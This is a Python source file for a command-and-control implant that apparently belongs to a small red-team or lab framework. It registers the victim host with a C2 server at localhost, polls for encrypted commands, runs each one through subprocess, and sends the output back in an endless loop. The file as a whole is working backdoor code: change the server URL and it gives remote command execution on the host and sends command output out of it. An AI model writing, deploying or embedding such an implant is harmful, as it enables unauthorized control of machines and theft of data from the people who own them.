import base64
import json
import platform
import socket
import subprocess
import time
import urllib.request
import uuid

from .crypto import decrypt_message, encrypt_message
from .shared_key import SHARED_KEY


def get_agent_id():
    return str(uuid.uuid4())[:8]


def register(agent_id, c2_url):
    data = {"agent_id": agent_id, "hostname": socket.gethostname(), "os": platform.system() + " " + platform.release()}
    req = urllib.request.Request(
        f"{c2_url}/register",
        data=json.dumps(data).encode(),
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=10) as response:
            return json.loads(response.read().decode())
    except Exception as e:
        print(f"[-] Register failed: {e}")
        return None


def get_task_encrypted(agent_id, c2_url):
    request_data = {"agent_id": agent_id}
    encrypted = encrypt_message(json.dumps(request_data))

    data = {"agent_id": agent_id, "data": base64.b64encode(encrypted).decode()}
    req = urllib.request.Request(
        f"{c2_url}/task", data=json.dumps(data).encode(), headers={"Content-Type": "application/json"}, method="POST"
    )
    try:
        with urllib.request.urlopen(req, timeout=10) as response:
            response_data = json.loads(response.read().decode())
            if "data" in response_data:
                ciphertext = base64.b64decode(response_data["data"])
                decrypted = decrypt_message(ciphertext)
                return json.loads(decrypted)
            return None
    except Exception as e:
        print(f"[-] Task check failed: {e}")
        return None


def send_result(agent_id, c2_url, command, output):
    data = {"agent_id": agent_id, "command": command, "output": output}
    req = urllib.request.Request(
        f"{c2_url}/result", data=json.dumps(data).encode(), headers={"Content-Type": "application/json"}, method="POST"
    )
    try:
        with urllib.request.urlopen(req, timeout=10) as response:
            return json.loads(response.read().decode())
    except Exception as e:
        print(f"[-] Send result failed: {e}")
        return None


def execute_command(cmd):
    # Using shell=False to avoid B602
    try:
        result = subprocess.run(cmd.split(), capture_output=True, text=True, timeout=30)
        output = result.stdout + result.stderr
        return output if output else "[+] Command executed (no output)"
    except Exception as e:
        return f"[-] Execution failed: {e}"


def run_windows_implant():
    agent_id = get_agent_id()
    c2_url = "http://localhost:8000"

    hostname = socket.gethostname()
    os_info = platform.system() + " " + platform.release()

    print(f"[+] Windows implant started on {hostname}")
    print(f"[+] Agent ID: {agent_id}")
    print(f"[+] OS: {os_info}")
    print(f"[+] Shared key: {SHARED_KEY.hex()[:16]}...")

    reg_result = register(agent_id, c2_url)
    if reg_result and reg_result.get("status") == "registered":
        print("[+] Successfully registered to C2 server")
    else:
        print("[-] Failed to register to C2 server")
        return

    print("[+] Entering task loop...")
    while True:
        task = get_task_encrypted(agent_id, c2_url)
        if task and task.get("command"):
            cmd = task["command"]
            print(f"[+] Executing: {cmd}")
            output = execute_command(cmd)
            print(f"[+] Output:\n{output}")
            send_result(agent_id, c2_url, cmd, output)
        else:
            print("[+] No tasks available")

        time.sleep(5)
